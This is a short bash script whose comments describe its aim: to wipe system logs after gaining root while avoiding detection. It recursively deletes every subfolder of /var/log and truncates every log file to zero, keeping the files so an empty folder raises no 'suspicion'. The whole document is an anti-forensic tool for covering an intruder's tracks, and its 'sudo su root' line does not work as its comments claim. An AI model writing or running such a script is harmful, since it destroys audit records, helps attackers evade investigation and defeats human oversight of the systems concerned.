#!/bin/bash

## This bash script works as follows:
## switch to root user
## if the item is a folder within the log folder it will delete the folder
## else if the items is a (log) file it will truncate / resize it to 0 or empty
## this clears the log file but does not delete to avoid suspicion by an empty log folder
## it can be improved if the subfolder are not deleted but if all files within subfolder are also resized to 0

sudo su root
for logfile in $(ls /var/log/);
do 
  if [ -d /var/log/$logfile ]; then
    rm -r /var/log/$logfile;
  else
    truncate -s 0 /var/log/$logfile;
  fi
done

